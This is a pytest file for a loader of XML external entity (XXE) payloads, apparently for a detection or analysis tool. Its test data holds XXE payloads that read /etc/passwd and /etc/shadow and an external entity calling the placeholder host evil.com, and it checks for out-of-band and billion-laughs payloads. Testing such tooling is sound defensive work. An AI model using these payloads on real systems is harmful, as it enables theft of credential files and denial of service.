from xxe_ai.corpus_loader import (
    BUILTIN_PAYLOADS,
    load_payloads_from_dir,
    normalize_payload,
)


def test_normalize_payload_strips_whitespace():
    assert normalize_payload('  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>  \n') == '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

def test_normalize_payload_drops_empty():
    assert normalize_payload("   \n\t") == ""

def test_normalize_payload_drops_comments():
    assert normalize_payload("# this is a comment") == ""

def test_builtin_payloads_has_classic_xxe():
    assert any("file:///etc/passwd" in p for p in BUILTIN_PAYLOADS)

def test_builtin_payloads_has_oob():
    assert any("% dtd" in p or "%dtd" in p for p in BUILTIN_PAYLOADS)

def test_builtin_payloads_has_svg():
    assert any("<svg" in p for p in BUILTIN_PAYLOADS)

def test_builtin_payloads_has_soap():
    assert any("soap" in p.lower() for p in BUILTIN_PAYLOADS)

def test_builtin_payloads_has_billion_laughs():
    assert any("lol" in p.lower() or "billion" in p.lower() for p in BUILTIN_PAYLOADS)

def test_builtin_payloads_has_benign():
    assert any("<root>" in p for p in BUILTIN_PAYLOADS)

def test_load_payloads_from_dir(tmp_path):
    d = tmp_path / "corpus"
    d.mkdir()
    (d / "a.txt").write_text('<!ENTITY a SYSTEM "file:///etc/passwd">\n<!ENTITY b SYSTEM "file:///etc/shadow">\n')
    (d / "b.txt").write_text('<!ENTITY c SYSTEM "http://evil.com/">')
    payloads = load_payloads_from_dir(d)
    assert len(payloads) == 3

def test_load_payloads_dedups(tmp_path):
    d = tmp_path / "corpus"
    d.mkdir()
    pl = '<!ENTITY a SYSTEM "file:///etc/passwd">'
    (d / "a.txt").write_text(f"{pl}\n{pl}")
    payloads = load_payloads_from_dir(d)
    assert len(payloads) == 1
